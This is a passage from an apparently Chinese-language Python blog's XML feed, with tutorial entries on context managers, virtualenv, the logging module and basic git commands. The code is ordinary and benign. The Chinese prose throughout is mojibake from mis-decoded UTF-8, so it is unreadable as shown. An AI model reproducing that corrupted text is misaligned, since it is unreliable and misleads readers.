class="keyword">print</span> <span class="string">"I'm &#123;status&#125;in the context."</span>.format(</div><div class="line">                    status=<span class="string">""</span> <span class="keyword">if</span> self.in_context <span class="keyword">else</span> <span class="string">"not "</span>)</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">with</span> CManager() <span class="keyword">as</span> ba:</div><div class="line">    ba.show()</div><div class="line">    <span class="comment"># blahblah</span></div><div class="line">    <span class="keyword">raise</span> NameError                     <span class="comment"># è§¦å‘NameErrorå¼‚å¸¸ï¼Œä»£ç å—åé¢çš„è¯­å¥å®é™…ä¸ä¼šæ‰§è¡Œï¼Œè€Œè¯¥å¼‚å¸¸ä¼šåœ¨__exit__å‡½æ•°ä¸­è¢«æ‹¦æˆª</span></div><div class="line">    <span class="keyword">print</span> <span class="string">'k'</span></div><div class="line"></div><div class="line">ba.show()</div></pre></td></tr></table></figure>
<p>ç¨‹åºè¾“å‡º:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">I&apos;m entering the context</div><div class="line">I&apos;m in the context.</div><div class="line">I&apos;m leaving the context</div><div class="line">I&apos;m not in the context.</div></pre></td></tr></table></figure>
<h1 id="4">4. å‚è€ƒæ–‡æ¡£</h1>
<ol>
<li><a href="https://docs.python.org/2.7/library/stdtypes.html#index-37" target="_blank" rel="external">Context Manager Types - Python Doc</a></li>
<li><a href="http://www.cnblogs.com/vamei/archive/2012/11/23/2772445.html" target="_blank" rel="external">Pythonæ·±å…¥02 ä¸Šä¸‹æ–‡ç®¡ç†å™¨</a></li>
<li><a href="http://python.jobbole.com/82494/" target="_blank" rel="external">æµ…è°ˆ Python çš„ with è¯­å¥</a></li>
</ol>
<h1 id="5">5. åè®°</h1>
<p>è¿™äº›å°çŸ¥è¯†ç‚¹å¹³æ—¶åªæ˜¯ç²—ç•¥çš„çœ‹ä¸€ä¸‹ï¼Œåªèƒ½è¾¾åˆ°ä¼šç”¨çš„ç¨‹åº¦ï¼Œæœ‰æ—¶å€™è§‰å¾—åªæœ‰è‡ªå·±æ•´ç†ä¸€éæ‰èƒ½çœŸæ­£ç†è§£å®ƒä»¬ï¼Œæ‰èƒ½ç†Ÿç»ƒè¿ç”¨ã€‚<br>
æ‰€ä»¥â€¦åˆå¡«å®Œä¸€ä¸ªå‘ã€‚å‘¨æœ«ç®€å•å†™å†™PyQt4å§â€¦</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;æœ€è¿‘çªå‘å¥‡æƒ³ï¼Œæƒ³å†™ä¸€ä¸ªèƒ½æ”¹å˜å½“å‰è¾“å‡ºç¯å¢ƒï¼Œè¾“å‡ºå½©è‰²æ–‡å­—çš„ä¸Šä¸‹æ–‡ç®¡ç†å™¨ï¼Œäºæ˜¯å­¦ä¹ äº†ä¸€ä¸‹ä¸Šä¸‹æ–‡ç®¡ç†ã€‚&lt;/p&gt;
    
    </summary>
    
      <category term="Python" scheme="//blog.stdioa.com/categories/Python/"/>
    
    
      <category term="python" scheme="//blog.stdioa.com/tags/python/"/>
    
      <category term="ä¸Šä¸‹æ–‡ç®¡ç†" scheme="//blog.stdioa.com/tags/%E4%B8%8A%E4%B8%8B%E6%96%87%E7%AE%A1%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>Pythonå­¦ä¹ ä¹‹virtualenv</title>
    <link href="//blog.stdioa.com/2015/10/learning-python-virtualenv/"/>
    <id>//blog.stdioa.com/2015/10/learning-python-virtualenv/</id>
    <published>2015-10-22T02:15:00.000Z</published>
    <updated>2016-11-08T13:48:35.543Z</updated>
    
    <content type="html"><![CDATA[<p>ç”¨è¿‡virtualenvçš„äººéƒ½è¯´å¥½ï¼Œå¯æ˜¯æˆ‘æ²¡æœ‰å…·ä½“ä½¿ç”¨è¿‡ï¼Œæ‰€ä»¥å°è¯•äº†ä¸€ä¸‹ï¼Œç”¨å®Œæˆ‘ä¹Ÿè¯´å¥½~233333</p>
<a id="more"></a>
<h1 id="1">1. ç®€ä»‹</h1>
<p>virtualenvæ˜¯ä¸€ä¸ªpythonåº“ï¼Œç”¨äºåˆ›å»ºç‹¬ç«‹pythonå¼€å‘åŠè¿è¡Œç¯å¢ƒã€‚ä¸€èˆ¬linuxç¯å¢ƒä¸‹å¦‚æœåœ¨å…¨å±€ç”¨pipå®‰è£…æ¨¡å—æ—¶éœ€è¦ä½¿ç”¨sudoå‘½ä»¤ï¼Œå¯æ˜¯åœ¨å…±äº«ä¸»æœºä¸Šå°†rootæƒé™äº¤ç»™ä¸€èˆ¬ç”¨æˆ·æ˜¯ä¸æ˜¾ç¤ºè€Œä¸”ä¸å®‰å…¨çš„ã€‚å¯æ˜¯æœ‰äº†virtualenv, æ™®é€šç”¨æˆ·å°±å¯ä»¥åˆ›å»ºä¸€ä¸ªè™šæ‹Ÿç¯å¢ƒï¼Œç„¶ååœ¨è™šæ‹Ÿç¯å¢ƒä¸­ä»¥æ™®é€šç”¨æˆ·æƒé™å®‰è£…æ¨¡å—ï¼Œæ›´æ”¹ç¯å¢ƒå˜é‡ï¼Œè¿›è¡Œå¼€å‘å’Œè¿è¡Œpythonç¨‹åºè€Œä¸ä¼šå½±å“ç³»ç»Ÿç¯å¢ƒçš„ç¯å¢ƒå˜é‡å’ŒPythonæ¨¡å—ã€‚</p>
<h1 id="2-virtualenv">2. åˆ›å»ºvirtualenvç¯å¢ƒ</h1>
<p>è¾“å…¥<code>virtualenv venv</code>åˆ›å»ºåä¸ºvenvçš„è™šæ‹Ÿç¯å¢ƒã€‚
åˆ›å»ºè™šæ‹Ÿç¯å¢ƒçš„å¸¸ç”¨é€‰é¡¹ï¼š</p>
<blockquote>
<p>â€“no-site-packages ä¸ä½¿ç”¨ç³»ç»Ÿä¸­çš„site packages
â€“system-site-package ä½¿ç”¨ç³»ç»Ÿä¸­çš„site packages <em>(æ®è¯´æ˜¯é»˜è®¤ï¼Œä½†åœ¨æˆ‘è¿™é»˜è®¤æ˜¯ä¸ä½¿ç”¨çš„)</em>
-p PYTHON_EXE, --python=PYTHON_EXE ä½¿ç”¨æŒ‡å®šçš„pythonè§£é‡Šå™¨ï¼Œè¿™é‡Œçš„PYTHON_EXEåœ¨Windowsä¸‹éœ€è¦ç”¨ç»å¯¹è·¯å¾„ï¼Œæ¯”å¦‚C:\Python27\python.exe\</p>
</blockquote>
<p>å½“ç„¶ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨è™šæ‹Ÿç¯å¢ƒå’Œç³»ç»Ÿé…ç½®æ–‡ä»¶æ¥è®¾ç½®virtualenvé»˜è®¤åˆ›å»ºé€‰é¡¹ï¼Œè¯¦æƒ…è§<a href="http://virtualenv-chinese-docs.readthedocs.org/en/latest/#id7" target="_blank" rel="external">è¿™é‡Œ</a>ã€‚</p>
<p>è¾“å‡ºï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">G:\&gt;virtualenv venv</div><div class="line">New python executable in venv\Scripts\python.exe</div><div class="line">Installing setuptools, pip, wheel...done.</div></pre></td></tr></table></figure>
<h1 id="3">3. è¿›å…¥åŠé€€å‡ºè™šæ‹Ÿç¯å¢ƒ</h1>
<p>è¿›å…¥venvç›®å½•ï¼ŒLinuxä¸‹è¾“å…¥<code>bin/activate</code>, Windowsä¸‹è¾“å…¥<code>Scripts\activate</code>è¿›å…¥è™šæ‹Ÿç¯å¢ƒã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">G:\venv&gt;Scripts\activate</div><div class="line">(venv) G:\venv&gt;</div></pre></td></tr></table></figure>
<p>è¿›å…¥ç¯å¢ƒåï¼Œè¾“å…¥<code>deactivate</code>é€€å‡ºã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">(venv) G:\venv&gt;deactivate</div><div class="line">G:\venv&gt;</div></pre></td></tr></table></figure>
<h1 id="4">4. ä½¿ç”¨è™šæ‹Ÿç¯å¢ƒ</h1>
<h2 id="41">4.1 å®‰è£…ç¬¬ä¸‰æ–¹æ¨¡å—</h2>
<p>å®‰è£…è¿‡ç¨‹ä¸å¹³æ—¶ç›¸ç¬¦ï¼ˆæ¯”å¦‚ä½¿ç”¨<code>pip install</code>), åªä¸è¿‡å®‰è£…åçš„åŒ…ä¼šå­˜å‚¨åœ¨è™šæ‹Ÿç¯å¢ƒä¸­ã€‚</p>
<h2 id="42">4.2 è®¾ç½®ç¯å¢ƒå˜é‡</h2>
<p>Linuxä¸‹è¾“å…¥<code>export VAR1=&quot;value1&quot;</code>, Windowsä¸‹è¾“å…¥<code>set VAR1=value1</code>æ¥è®¾ç½®è™šæ‹Ÿç¯å¢ƒçš„ç¯å¢ƒå˜é‡</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">(venv) C:\Users\Stdio\Desktop\temp\venv&gt;set VAR1=value1</div><div class="line"></div><div class="line">(venv) C:\Users\Stdio\Desktop\temp\venv&gt;echo %VAR1%</div><div class="line">value1</div></pre></td></tr></table></figure>
<p>ç¯å¢ƒå˜é‡è®¾ç½®æˆåŠŸåï¼Œå³å¯åœ¨Pythonç¨‹åºä¸­åˆ©ç”¨è™šæ‹Ÿç¯å¢ƒçš„ç¯å¢ƒå˜é‡è¿›è¡Œç¨‹åºé…ç½®ï¼ˆæ¯”å¦‚flaskä¸­çš„<code>app.config.from_envvar(&quot;FLASK_SETTINGS&quot;)</code>ï¼‰ã€‚è¯¥ç¯å¢ƒå˜é‡åªåœ¨è™šæ‹Ÿç¯å¢ƒä¸­æœ‰æ•ˆï¼Œé€€å‡ºè™šæ‹Ÿç¯å¢ƒåç¯å¢ƒå˜é‡å³æ¶ˆå¤±ã€‚</p>
<h1 id="5">5. å‚è€ƒæ–‡æ¡£</h1>
<ol>
<li><a href="http://virtualenv.readthedocs.org/en/latest/index.html" target="_blank" rel="external">Virtualenv - virtualenv 13.1.2 documentation</a></li>
<li><a href="http://virtualenv.readthedocs.org/en/latest/index.html" target="_blank" rel="external">Virtualenv - virtualenv 1.7.1.2.post1 documentation ä¸­æ–‡ç‰ˆ</a></li>
<li><a href="http://flask123.sinaapp.com/article/39/" target="_blank" rel="external">virtualenvå…¥é—¨æ•™ç¨‹</a></li>
<li><a href="http://www.cnblogs.com/tk091/p/3700013.html" target="_blank" rel="external">virtualenv â€“ pythonè™šæ‹Ÿæ²™ç›’</a></li>
<li><a href="http://www.nowamagic.net/academy/detail/1330228" target="_blank" rel="external">ç”¨virtualenvå»ºç«‹å¤šä¸ªPythonç‹¬ç«‹å¼€å‘ç¯å¢ƒ</a></li>
</ol>
<h1 id="6">6. åè®°</h1>
<p>åˆå¡«å®Œä¸€ä¸ªå‘ï¼Œæœ¬æ¥æ‰“ç®—æ˜¨å¤©å°±å†™å¥½çš„ï¼Œç»“æœæ˜¨å¤©æ²¡å†™å®Œâ€¦</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ç”¨è¿‡virtualenvçš„äººéƒ½è¯´å¥½ï¼Œå¯æ˜¯æˆ‘æ²¡æœ‰å…·ä½“ä½¿ç”¨è¿‡ï¼Œæ‰€ä»¥å°è¯•äº†ä¸€ä¸‹ï¼Œç”¨å®Œæˆ‘ä¹Ÿè¯´å¥½~233333&lt;/p&gt;
    
    </summary>
    
      <category term="Python" scheme="//blog.stdioa.com/categories/Python/"/>
    
    
      <category term="python" scheme="//blog.stdioa.com/tags/python/"/>
    
      <category term="virtualenv" scheme="//blog.stdioa.com/tags/virtualenv/"/>
    
  </entry>
  
  <entry>
    <title>Pythonå­¦ä¹ ä¹‹logging</title>
    <link href="//blog.stdioa.com/2015/10/learning-python-logging/"/>
    <id>//blog.stdioa.com/2015/10/learning-python-logging/</id>
    <published>2015-10-21T08:00:00.000Z</published>
    <updated>2016-11-08T13:48:35.533Z</updated>
    
    <content type="html"><![CDATA[<p>ä»¥å‰å†™ä»£ç çš„æ—¶å€™ï¼Œæ‰€æœ‰ä¿¡æ¯åŒ…æ‹¬è°ƒè¯•ä¿¡æ¯å…¨éƒ¨è¾“å‡ºåœ¨å±å¹•ä¸Šï¼Œæœ‰çš„æ—¶å€™ä¼šçœ‹èµ·æ¥ä¹±ç³Ÿç³Ÿçš„ï¼Œè¿™æ—¶å°±éœ€è¦loggingæ¨¡å—æ¥è®°å½•ä¿¡æ¯æˆ–ç”Ÿæˆæ—¥å¿—æ–‡ä»¶ã€‚</p>
<a id="more"></a>
<h1 id="1">1. ç®€ä»‹</h1>
<p>loggingæ˜¯ä¸€ä¸ªç”¨æ¥è®°å½•æ—¥å¿—ä¿¡æ¯çš„æ¨¡å—ï¼Œå®ƒå¯ä»¥è¾“å‡ºä¿¡æ¯åˆ°stdoutæˆ–è€…è‡ªå®šçš„æ—¥å¿—æ–‡ä»¶ä¸­ã€‚</p>
<h1 id="2">2. åŸºæœ¬</h1>
<p>è¾“å‡ºä¿¡æ¯ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">logging.debug(<span class="string">"A debug message"</span>)</div><div class="line">logging.info(<span class="string">"A info message"</span>)</div><div class="line">logging.warn(<span class="string">"A warning message"</span>)</div><div class="line">logging.error(<span class="string">"A error message"</span>)</div><div class="line">logging.critical(<span class="string">"A critical message"</span>)</div></pre></td></tr></table></figure>
<p>æ—¥å¿—çº§åˆ«ï¼š
loggingé»˜è®¤çš„æ—¥å¿—çº§åˆ«ä¸ºWARNINGï¼Œåœ¨å½“å‰çº§åˆ«ä¸‹ï¼Œåªæœ‰warningåŠä»¥ä¸Šçš„æ—¥å¿—å¯ä»¥è¢«è®°å½•ã€‚loggingçš„çº§åˆ«å¯é€šè¿‡<code>logging.basicConfig</code>æˆ–<code>logging.setLevel</code>æ¥ä¿®æ”¹ã€‚çº§åˆ«å¤§å°å…³ç³»ä¸ºCRITICAL(50) &gt; ERROR(40) &gt; WARNING(30) &gt; INFO(20) &gt; DEBUG(10) &gt; NOTSET(0), éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä¸€æ—¦è®°å½•ä¿¡æ¯ï¼Œloggingçš„æ—¥å¿—çº§åˆ«å°±ä¸å¯å†æ›´æ”¹ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>logging.basicConfig(level=logging.INFO)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>logging.info(<span class="string">"Info"</span>)</div><div class="line">INFO:root:Info</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>logging.basicConfig(level=logging.DEBUG)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>logging.debug(<span class="string">"Debug"</span>)                      <span class="comment"># æ²¡æœ‰è¾“å‡º</span></div></pre></td></tr></table></figure>
<h1 id="3">3. æ—¥å¿—æ ¼å¼è®¾ç½®åŠæ—¥å¿—æ–‡ä»¶æ“ä½œ</h1>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> logging</div><div class="line"><span class="keyword">import</span> time</div><div class="line"></div><div class="line">logging.basicConfig(format=<span class="string">"%(asctime)s %(levelname)s %(message)s"</span>,</div><div class="line">                        datefmt=<span class="string">"%Y %b %d %H:%M:%S"</span>,</div><div class="line">                        filename=<span class="string">"./log.log"</span>,</div><div class="line">                        filemode=<span class="string">"w"</span>,               <span class="comment"># default is "a"</span></div><div class="line">                        level=logging.INFO)</div><div class="line"></div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</div><div class="line">        logging.log(i*<span class="number">10</span>, <span class="string">"a log"</span>)                  <span class="comment"># logging.log(level, msg)</span></div><div class="line">        time.sleep(<span class="number">1</span>)</div></pre></td></tr></table></figure>
<p>log.logè¾“å‡º(å¯ä»¥ç”¨tail -få‘½ä»¤å®æ—¶æŸ¥çœ‹):</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">2015 Oct 21 14:41:36 INFO a log</div><div class="line">2015 Oct 21 14:41:37 WARNING a log</div><div class="line">2015 Oct 21 14:41:38 ERROR a log</div><div class="line">2015 Oct 21 14:41:41 CRITICAL a log</div><div class="line">2015 Oct 21 14:41:42 INFO a log</div><div class="line">2015 Oct 21 14:41:43 WARNING a log</div><div class="line">2015 Oct 21 14:41:44 ERROR a log</div><div class="line">2015 Oct 21 14:41:45 CRITICAL a log</div></pre></td></tr></table></figure>
<h1 id="4">4. å°†æ—¥å¿—è¾“å‡ºåˆ°å¤šä¸ªæµä¸­</h1>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> logging</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"></div><div class="line"><span class="comment"># å¯ä»¥é€šè¿‡logging.basicConfigè®¾ç½®ä¸€ä¸ªé»˜è®¤æµ</span></div><div class="line"></div><div class="line">console = logging.StreamHandler(stream=sys.stdout)                    <span class="comment"># é»˜è®¤æµä¸ºsys.stderr</span></div><div class="line">console.setLevel(logging.INFO)</div><div class="line">formatter = logging.Formatter(<span class="string">'%(name)-12s: %(levelname)-8s %(message)s'</span>)</div><div class="line">console.setFormatter(formatter)</div><div class="line">logging.getLogger().addHandler(console)</div><div class="line"></div><div class="line">files = logging.FileHandler(<span class="string">"log2.log"</span>, mode=<span class="string">"a"</span>, encoding=<span class="string">"utf-8"</span>)   <span class="comment"># è®¾ç½®æ–‡ä»¶æµ</span></div><div class="line">files.setLevel(logging.WARNING)</div><div class="line">formatter = logging.Formatter(<span class="string">"%(levelname)s %(message)s"</span>)</div><div class="line">files.setFormatter(formatter)</div><div class="line">logging.getLogger().addHandler(files)</div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">6</span>):</div><div class="line">    logging.log(i*<span class="number">10</span>, logging.getLevelName(i*<span class="number">10</span>).lower())</div></pre></td></tr></table></figure>
<h1 id="5-logger">5. è®¾ç½®å¤šä¸ªloggerä»¥è®°å½•ä¸åŒä¿¡æ¯</h1>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># coding: utf-8</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> logging</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"></div><div class="line">log1 = logging.Logger(<span class="string">"0.0"</span>)</div><div class="line"></div><div class="line">console = logging.StreamHandler(sys.stdout)                               <span class="comment"># é»˜è®¤æµä¸ºsys.stderr</span></div><div class="line">console.setLevel(logging.INFO)</div><div class="line">formatter = logging.Formatter(<span class="string">'%(name)-12s: %(levelname)-8s %(message)s'</span>)</div><div class="line">console.setFormatter(formatter)</div><div class="line">log1.addHandler(console)</div><div class="line"></div><div class="line">log2 = logging.Logger(<span class="string">"-.-"</span>)</div><div class="line"></div><div class="line">files = logging.FileHandler(<span class="string">"log2.log"</span>, mode=<span class="string">"a"</span>, encoding=<span class="string">"utf-8"</span>)     <span class="comment"># è®¾ç½®æ–‡ä»¶æµ</span></div><div class="line">files.setLevel(logging.WARNING)</div><div class="line">formatter = logging.Formatter(<span class="string">"%(name)s %(levelname)s %(message)s"</span>)</div><div class="line">files.setFormatter(formatter)</div><div class="line">log2.addHandler(files)</div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">6</span>):</div><div class="line">    log1.log(i*<span class="number">10</span>, logging.getLevelName(i*<span class="number">10</span>).lower())</div><div class="line">    log2.log(i*<span class="number">10</span>, logging.getLevelName(i*<span class="number">10</span>).lower())</div><div class="line"></div><div class="line">logging.critical(<span class="string">"AHHH! I'm the root logger but you forget me!"</span>)        <span class="comment"># é»˜è®¤ä½¿ç”¨loggingæ—¶logger nameä¸º"root"</span></div><div class="line">logging.getLogger(<span class="string">"root"</span>).info(<span class="string">"Of course not!"</span>)</div></pre></td></tr></table></figure>
<h1 id="5">5. å‚è€ƒæ–‡æ¡£</h1>
<ol>
<li><a href="https://docs.python.org/2.7/howto/logging.html" target="_blank" rel="external">Logging HOWTO</a></li>
<li><a href="http://www.cnblogs.com/dkblog/archive/2011/08/26/2155018.html" target="_blank" rel="external">python çš„æ—¥å¿—loggingæ¨¡å—å­¦ä¹ </a></li>
</ol>
<h1 id="6">6. åè®°</h1>
<p>åˆå¡«å®Œä¸€ä¸ªå‘ï¼Œæœ€è¿‘è¦å¡«çš„å‘å¥½å¤šâ€¦</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ä»¥å‰å†™ä»£ç çš„æ—¶å€™ï¼Œæ‰€æœ‰ä¿¡æ¯åŒ…æ‹¬è°ƒè¯•ä¿¡æ¯å…¨éƒ¨è¾“å‡ºåœ¨å±å¹•ä¸Šï¼Œæœ‰çš„æ—¶å€™ä¼šçœ‹èµ·æ¥ä¹±ç³Ÿç³Ÿçš„ï¼Œè¿™æ—¶å°±éœ€è¦loggingæ¨¡å—æ¥è®°å½•ä¿¡æ¯æˆ–ç”Ÿæˆæ—¥å¿—æ–‡ä»¶ã€‚&lt;/p&gt;
    
    </summary>
    
      <category term="Python" scheme="//blog.stdioa.com/categories/Python/"/>
    
    
      <category term="python" scheme="//blog.stdioa.com/tags/python/"/>
    
      <category term="logging" scheme="//blog.stdioa.com/tags/logging/"/>
    
  </entry>
  
  <entry>
    <title>éšæ‰‹è®°ä¹‹Git</title>
    <link href="//blog.stdioa.com/2015/10/essay-git/"/>
    <id>//blog.stdioa.com/2015/10/essay-git/</id>
    <published>2015-10-14T10:28:00.000Z</published>
    <updated>2016-11-08T13:48:35.485Z</updated>
    
    <content type="html"><![CDATA[<p>ä»ä¸€å¹´å‰å¼€å§‹ä½¿ç”¨Git, ä¸€ç›´æ²¡ç³»ç»Ÿæ•´ç†è¿‡Gitçš„å‘½ä»¤ï¼Œå‰å‡ å¤©åœ¨éƒ¨ç½²ä»£ç çš„æ—¶å€™å‡ºäº†é—®é¢˜ä¸çŸ¥é“è¯¥å¦‚ä½•è§£å†³ï¼Œäºæ˜¯å†³å®šæ•´ç†ä¸€ä»½Gitçš„ä½¿ç”¨æ–¹æ³•ã€‚æœ¬åšæ–‡ä¼šæŒç»­æ›´æ–°ã€‚</p>
<a id="more"></a>
<h1 id="1-git">1. ä»€ä¹ˆæ˜¯Git</h1>
<p>Linuså¤§ç¥å†™çš„åˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶å·¥å…·ï¼Œå…·ä½“è¯·è®¿é—®å®˜ç½‘<a href="http://git-scm.com" target="_blank" rel="external">http://git-scm.com</a>.
Wikipediaé“¾æ¥: <a href="https://en.wikipedia.org/wiki/Git_(software)" target="_blank" rel="external">Git (software)</a></p>
<h1 id="2">2. åŸºæœ¬æ“ä½œ</h1>
<p>åˆå§‹åŒ–ç‰ˆæœ¬ä»“åº“: <code>git init</code>
ä»è¿œç¨‹ä»“åº“å…‹éš†: <code>git clone [url] [repo_name]</code><br>
ä¾‹: <code>git clone https://github.com/user/repo my_repo</code></p>
<p><img src="/pics/lifecycle.png" alt="life-cycle"></p>
<center><small>æ–‡ä»¶çš„çŠ¶æ€å˜åŒ–å‘¨æœŸ</small></center>
<p>æ£€æŸ¥æ–‡ä»¶çŠ¶æ€: <code>git status</code>
çŠ¶æ€ç®€è§ˆ: <code>git status -s</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">$ git status -s</div><div class="line"> M README</div><div class="line">MM Rakefile</div><div class="line">A  lib/git.rb</div><div class="line">M  lib/simplegit.rb</div><div class="line">?? LICENSE.txt</div></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th style="text-align:left">å­—æ¯</th>
<th style="text-align:center">æ‰€ä»£è¡¨çš„çŠ¶æ€</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">??</td>
<td style="text-align:center">æœªè¿½è¸ª</td>
</tr>
<tr>
<td style="text-align:left">Â Â Â M</td>
<td style="text-align:center">å·²ä¿®æ”¹ï¼Œæœªæš‚å­˜</td>
</tr>
<tr>
<td style="text-align:left">MM</td>
<td style="text-align:center">ä¿®æ”¹åæš‚å­˜ï¼Œç„¶ååˆä¿®æ”¹</td>
</tr>
<tr>
<td style="text-align:left">A</td>
<td style="text-align:center">æ–°æ·»åŠ åˆ°æš‚å­˜åŒº</td>
</tr>
<tr>
<td style="text-align:left">M</td>
<td style="text-align:center">ä¿®æ”¹åæ·»åŠ åˆ°æš‚å­˜åŒº</td>
</tr>
</tbody>
</table>
<p>å¿½ç•¥æ–‡ä»¶ï¼š ç¼–è¾‘<code>.gitignore</code>æ–‡ä»¶ã€‚<br>
æ–‡ä»¶ .gitignore çš„æ ¼å¼è§„èŒƒå¦‚ä¸‹ï¼š</p>
<ul>
<li>æ‰€æœ‰ç©ºè¡Œæˆ–è€…ä»¥ ï¼ƒ å¼€å¤´çš„è¡Œéƒ½ä¼šè¢« Git å¿½ç•¥ã€‚</li>
<li>å¯ä»¥ä½¿ç”¨æ ‡å‡†çš„ glob æ¨¡å¼åŒ¹é…ã€‚</li>
<li>åŒ¹é…æ¨¡å¼å¯ä»¥ä»¥ï¼ˆ/ï¼‰å¼€å¤´é˜²æ­¢é€’å½’ã€‚</li>
<li>åŒ¹é…æ¨¡å¼å¯ä»¥ä»¥ï¼ˆ/ï¼‰ç»“å°¾æŒ‡å®šç›®å½•ã€‚</li>
<li>è¦å¿½ç•¥æŒ‡å®šæ¨¡å¼ä»¥å¤–çš„æ–‡ä»¶æˆ–ç›®å½•ï¼Œå¯ä»¥åœ¨æ¨¡å¼å‰åŠ ä¸ŠæƒŠå¹å·ï¼ˆ!ï¼‰å–åã€‚
å…·ä½“ä¾‹å­è§<a href="http://git-scm.com/book/zh/v2/Git-%E5%9F%BA%E7%A1%80-%E8%AE%B0%E5%BD%95%E6%AF%8F%E6%AC%A1%E6%9B%B4%E6%96%B0%E5%88%B0%E4%BB%93%E5%BA%93" target="_blank" rel="external">Git-åŸºç¡€</a>ã€‚</li>
</ul>
<p>æŸ¥çœ‹å°šæœªæš‚å­˜çš„æ–‡ä»¶æ›´æ–°éƒ¨åˆ†: <code>git diff</code>
æŸ¥çœ‹å·²æš‚å­˜çš„æ–‡ä»¶æ›´æ–°çš„éƒ¨åˆ†: <code>git diff --staged</code></p>
<p>æäº¤æ›´æ–°: <code>git commit</code>
<code>git commit -a</code> = <code>git add --all; git commit</code>
æäº¤æ—¶è¾“å…¥å•è¡Œä¿¡æ¯(Commit log): <code>git commit -m</code></p>
<p>æ·»åŠ æ–‡ä»¶: <code>git add [filename]</code>, ä½¿gitè·Ÿè¸ªæ–‡ä»¶
åˆ é™¤æ–‡ä»¶: <code>git rm [filename]</code>, ä½¿gitåœæ­¢è·Ÿè¸ªæ–‡ä»¶å¹¶å°†æ–‡ä»¶åˆ é™¤
åœæ­¢è·Ÿè¸ªæ–‡ä»¶: <code>git rm --cached</code>, åœæ­¢è·Ÿè¸ªä½†ä¸åˆ é™¤æ–‡ä»¶
ç§»åŠ¨æ–‡ä»¶: <code>git mv</code>, è§„åˆ™å’Œ<code>mv</code>åŸºæœ¬ç›¸åŒ</p>
<p>æŸ¥çœ‹æäº¤å†å²: <code>git log</code>
æ˜¾ç¤ºæ¯æ¬¡æäº¤çš„å†…å®¹å·®å¼‚: <code>git log -p</code>
æŸ¥çœ‹æ¯æ¬¡æäº¤çš„ç®€ç•¥ç»Ÿè®¡ä¿¡æ¯: <code>git log --stat</code>
æŸ¥çœ‹æ¯æ¬¡æäº¤çš„ä»£ç æ›´æ”¹è¯¦æƒ…ï¼š<code>git log --cc</code>
æ˜¾ç¤ºASCIIå›¾å½¢è¡¨ç¤ºçš„åˆ†æ”¯åˆå¹¶å†å²: <code>git log --graph</code>
